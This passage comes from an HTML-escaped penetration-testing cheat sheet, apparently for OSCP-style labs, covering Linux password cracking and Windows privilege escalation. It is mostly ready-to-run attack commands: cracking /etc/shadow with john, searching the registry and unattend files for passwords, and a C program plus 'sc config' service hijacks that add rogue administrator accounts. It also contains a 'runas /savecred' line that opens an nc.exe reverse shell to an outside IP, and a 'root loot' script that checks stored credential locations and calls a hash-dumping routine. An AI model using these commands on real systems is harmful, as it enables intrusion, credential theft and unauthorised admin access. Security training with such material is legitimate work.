&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;unshadow &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow &#x2F;tmp&#x2F;combined; john --wordlist=&amp;lt;any word list&amp;gt; &#x2F;tmp&#x2F;combined
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Online rainbow tables:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;crackstation.net&#x2F;&quot;&gt;https:&#x2F;&#x2F;crackstation.net&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.cmd5.org&#x2F;&quot;&gt;http:&#x2F;&#x2F;www.cmd5.org&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;crackhash.com&#x2F;&quot;&gt;http:&#x2F;&#x2F;crackhash.com&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;hashkiller.co.uk&#x2F;md5-decrypter.aspx&quot;&gt;https:&#x2F;&#x2F;hashkiller.co.uk&#x2F;md5-decrypter.aspx&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.onlinehashcrack.com&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.onlinehashcrack.com&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;rainbowtables.it64.com&#x2F;&quot;&gt;http:&#x2F;&#x2F;rainbowtables.it64.com&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.md5online.org&#x2F;&quot;&gt;http:&#x2F;&#x2F;www.md5online.org&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;tips-and-tricks-for-windows-privilege-escalation&quot;&gt;Tips and Tricks for Windows Privilege Escalation&lt;&#x2F;h2&gt;
&lt;p&gt;Windows privesc scripts and binaries:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;jivoi&#x2F;pentest&#x2F;tree&#x2F;master&#x2F;exploit_win&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;jivoi&#x2F;pentest&#x2F;tree&#x2F;master&#x2F;exploit_win&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;abatchy17&#x2F;WindowsExploits&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;abatchy17&#x2F;WindowsExploits&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;hackingandsecurity.blogspot.com&#x2F;2017&#x2F;09&#x2F;oscp-windows-priviledge-escalation.html&quot;&gt;https:&#x2F;&#x2F;hackingandsecurity.blogspot.com&#x2F;2017&#x2F;09&#x2F;oscp-windows-priviledge-escalation.html&lt;&#x2F;a&gt; - Great list for Windows XP&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;3ndG4me&#x2F;AutoBlue-MS17-010&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;3ndG4me&#x2F;AutoBlue-MS17-010&lt;&#x2F;a&gt; - Great exploit for windows 2000 to Windows 10&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@sdgeek&#x2F;hack-the-box-htb-blue-115b3f563125&quot;&gt;https:&#x2F;&#x2F;medium.com&#x2F;@sdgeek&#x2F;hack-the-box-htb-blue-115b3f563125&lt;&#x2F;a&gt; - MS17-010 Exploit tutorial&lt;&#x2F;p&gt;
&lt;h2 id=&quot;windows-privilege-escalation&quot;&gt;Windows Privilege Escalation&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&quot;&gt;https:&#x2F;&#x2F;www.youtube.com&#x2F;playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Gathering information of the system:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.fuzzysecurity.com&#x2F;tutorials&#x2F;16.html&quot;&gt;http:&#x2F;&#x2F;www.fuzzysecurity.com&#x2F;tutorials&#x2F;16.html&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ver
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;hostname
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;whoami
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;echo %username%
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;systeminfo | findstr &#x2F;B &#x2F;C:&amp;quot;OS Name&amp;quot; &#x2F;C:&amp;quot;OS Version&amp;quot; hostname echo %username% net users ipconfig &#x2F;all route print arp -A netstat -ano netsh firewall show state netsh firewall show config shtasks &#x2F;query &#x2F;fo LIST &#x2F;v tasklist &#x2F;SVC net start
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Check list of installed Windows patches:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Windows exploit suggester:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;GDSSecurity&#x2F;Windows-Exploit-Suggester&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;GDSSecurity&#x2F;Windows-Exploit-Suggester&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Potential files containing passwords:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;c:\sysprep.inf
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;c:\sysprep\sysprep.xml
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;%WINDIR%\Panther\Unattend\Unattended.xml
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;%WINDIR%\Panther\Unattended.xml
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;c:\unattend.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;c:\sysprep.ini - [Clear Text]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;c:\sysprep\sysprep.xml - [Base64]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;findstr &#x2F;si password *.txt | *.xml | *.ini
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;reg query HKLM &#x2F;s | findstr &#x2F;i password &amp;gt; temp.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;reg query HKCU &#x2F;s | findstr &#x2F;i password &amp;gt; temp.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Windows Python Installer to run a single .py script as an .exe file:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Install python on Windows machine.&lt;&#x2F;li&gt;
&lt;li&gt;Extract pyinstaller.zip&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;python pyinstaller.py --onefile ms11-080.py&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Check insecure permissions, create malicious code and replace the .exe with insecure permissions:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;icacls scsiaccess.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stdlib.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main &lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i;
&lt;&#x2F;span&gt;&lt;span&gt;  i=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;system &lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;net localgroup administrators low &#x2F;add&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Cross compile exploits:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;platforms&#x2F;windows&#x2F;local&#x2F;&amp;lt;exploit&amp;gt;.c &#x2F;tmp&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;cd &#x2F;root&#x2F;.wine&#x2F;drive_c&#x2F;MinGW&#x2F;bin&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;wine gcc –o w00t.exe &#x2F;tmp&#x2F;&amp;lt;exploit&amp;gt;.c -l lib&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Runas Account command:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;runas &#x2F;user:offsec-labs\low cmd.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Add user to local group:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;accesschk.exe -uwqs users c:\*.*
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;accesschk.exe -uwqs “Authenticated Users” c:\*.*
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cacls &amp;quot;c:\Program Files&amp;quot; &#x2F;T | findstr Users
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Find weak service permissions:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;accesschk.exe -uwcqv *
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Accesschk.exe for Windows XP:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;web.archive.org&#x2F;web&#x2F;20080530012252&#x2F;http:&#x2F;&#x2F;live.sysinternals.com&#x2F;accesschk.exe&quot;&gt;https:&#x2F;&#x2F;web.archive.org&#x2F;web&#x2F;20080530012252&#x2F;http:&#x2F;&#x2F;live.sysinternals.com&#x2F;accesschk.exe&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Accesschk.exe commands to find read&#x2F;write services:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;accesschk.exe -uwcqv &amp;quot;Authenticated Users&amp;quot; * &#x2F;accepteula - This command worked for XP
&lt;&#x2F;span&gt;&lt;span&gt;accesschk.exe -qdws &amp;quot;Authenticated Users&amp;quot; C:\Windows\ &#x2F;accepteula
&lt;&#x2F;span&gt;&lt;span&gt;accesschk.exe -qdws Users C:\Windows\
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If you found a vulnerable RW service from using accesschk:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sc config upnphost binpath= &amp;quot;net user rootuser r00ted123 &#x2F;add&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;sc config upnphost obj= &amp;quot;.\LocalSystem&amp;quot; password= &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;sc config upnphost depend= &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then proceed with restarting the service to execute the binpath command and add new user to administrators group:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sc start upnphost
&lt;&#x2F;span&gt;&lt;span&gt;sc config upnphost binpath= &amp;quot;net localgroup administrators rootuser &#x2F;add&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;sc config upnphost obj= &amp;quot;.\LocalSystem&amp;quot; password= &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;sc config upnphost depend= &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;sc start upnphost
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Check for stored credentials:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cmdkey &#x2F;list
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If there are entries, it means that we may able to &lt;code&gt;runas&lt;&#x2F;code&gt; certain user who stored his credentials in windows:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;runas &#x2F;savecred &#x2F;user:ACCESS\Administrator &amp;quot;c:\windows\system32\cmd.exe &#x2F;c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Windows Exploits by Patch:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;MS10-015
&lt;&#x2F;span&gt;&lt;span&gt;MS10-059
&lt;&#x2F;span&gt;&lt;span&gt;MS10-092
&lt;&#x2F;span&gt;&lt;span&gt;MS11-080
&lt;&#x2F;span&gt;&lt;span&gt;MS13-005
&lt;&#x2F;span&gt;&lt;span&gt;CVE-2013-3660
&lt;&#x2F;span&gt;&lt;span&gt;MS13-053
&lt;&#x2F;span&gt;&lt;span&gt;MS13-081
&lt;&#x2F;span&gt;&lt;span&gt;MS14-058
&lt;&#x2F;span&gt;&lt;span&gt;MS14-068
&lt;&#x2F;span&gt;&lt;span&gt;MS14-070
&lt;&#x2F;span&gt;&lt;span&gt;MS15-001
&lt;&#x2F;span&gt;&lt;span&gt;MS15-051
&lt;&#x2F;span&gt;&lt;span&gt;MS15-052
&lt;&#x2F;span&gt;&lt;span&gt;MS17-010 - [https:&#x2F;&#x2F;github.com&#x2F;worawit&#x2F;MS17-010&#x2F;](https:&#x2F;&#x2F;github.com&#x2F;worawit&#x2F;MS17-010&#x2F;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Windows Enumeration Script:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;batch&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-batch &quot;&gt;&lt;code class=&quot;language-batch&quot; data-lang=&quot;batch&quot;&gt;&lt;span&gt;@echo OFF
&lt;&#x2F;span&gt;&lt;span&gt;call:credits
&lt;&#x2F;span&gt;&lt;span&gt;call:CheckOSbitrate
&lt;&#x2F;span&gt;&lt;span&gt;call:CheckOSversion
&lt;&#x2F;span&gt;&lt;span&gt;call:checkprerequisitefiles
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;call:checkquickwins
&lt;&#x2F;span&gt;&lt;span&gt;call:getfirewallinformation
&lt;&#x2F;span&gt;&lt;span&gt;call:getcomputerinformation
&lt;&#x2F;span&gt;&lt;span&gt;call:dumphashespasseskerberoscerts
&lt;&#x2F;span&gt;&lt;span&gt;call:findinterestingfiles
&lt;&#x2F;span&gt;&lt;span&gt;call:findinterestingregistrykeys
&lt;&#x2F;span&gt;&lt;span&gt;call:findpasswords
&lt;&#x2F;span&gt;&lt;span&gt;call:checkweakpermissions
&lt;&#x2F;span&gt;&lt;span&gt;call:cleanup
&lt;&#x2F;span&gt;&lt;span&gt;goto end
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:credits
&lt;&#x2F;span&gt;&lt;span&gt;echo.----------------------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;echo.Author: Jollyfrogs, Brisbane QLD
&lt;&#x2F;span&gt;&lt;span&gt;echo.A root loot script I used to learn batch techniquesP, needs TLC
&lt;&#x2F;span&gt;&lt;span&gt;echo.----------------------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:CheckOSbitrate
&lt;&#x2F;span&gt;&lt;span&gt;IF DEFINED ProgramFiles(x86) (set OSbit=64) else (set OSbit=32)
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:checkprerequisitefiles
&lt;&#x2F;span&gt;&lt;span&gt;REM SOME OF THESE COMMANDS MIGHT GENERATE ERRORS SO WE CATCH THEM ALL HERE
&lt;&#x2F;span&gt;&lt;span&gt;echo ====================================================================
&lt;&#x2F;span&gt;&lt;span&gt;echo ====================== IGNORE THESE ERRORS =========================
&lt;&#x2F;span&gt;&lt;span&gt;dir jollykatz%OSbit%.exe &#x2F;a&#x2F;s&#x2F;b 1&amp;gt; nul 2&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 set jollykatz=1
&lt;&#x2F;span&gt;&lt;span&gt;for &#x2F;f &amp;quot;tokens=1 delims=&amp;quot; %%a in (&amp;#39;whoami&amp;#39;) do set whoami=%%a
&lt;&#x2F;span&gt;&lt;span&gt;for &#x2F;f &amp;quot;tokens=1 delims=&amp;quot; %%a in (&amp;#39;netsh &#x2F;? ^| findstr \.*.irewal.*.*&amp;#39;) do set netshfirewall=%%a
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;REM
&lt;&#x2F;span&gt;&lt;span&gt;REM check registry for the following registry entries:
&lt;&#x2F;span&gt;&lt;span&gt;REM
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated | Find &amp;quot;0x1&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (
&lt;&#x2F;span&gt;&lt;span&gt;	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated | Find &amp;quot;0x1&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;	IF %ERRORLEVEL% == 0 (set alwaysinstallelevated=1)
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Protected Storage System Provider&amp;quot; &#x2F;v &amp;quot;Protected Storage&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set IE6found=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set IE7found=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\America Online\AIM6\Passwords&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set AIM6found=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\AIM\AIMPRO&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set AIMPROfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Beyluxe Messenger&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set BEYLUXEfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set BIGANTfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Camfrog\Client&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set CAMFROGfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Google\Google Talk\Accounts&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set GOOGLETALKfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\IMVU&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set IMVUfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Nimbuzz\PCClient\Application&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set NIMBUZZfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Paltalk&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set PALTALKfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Yahoo\Pager&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set YAHOOPAGERfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\IncrediMail&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set INCREDIMAILfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set OUTLOOK2013found=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set OUTLOOK2010POSTNTfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set OUTLOOK2010PRENTfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set OUTLOOK98MAILONLYfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set OUTLOOK98NORMALfound=1)
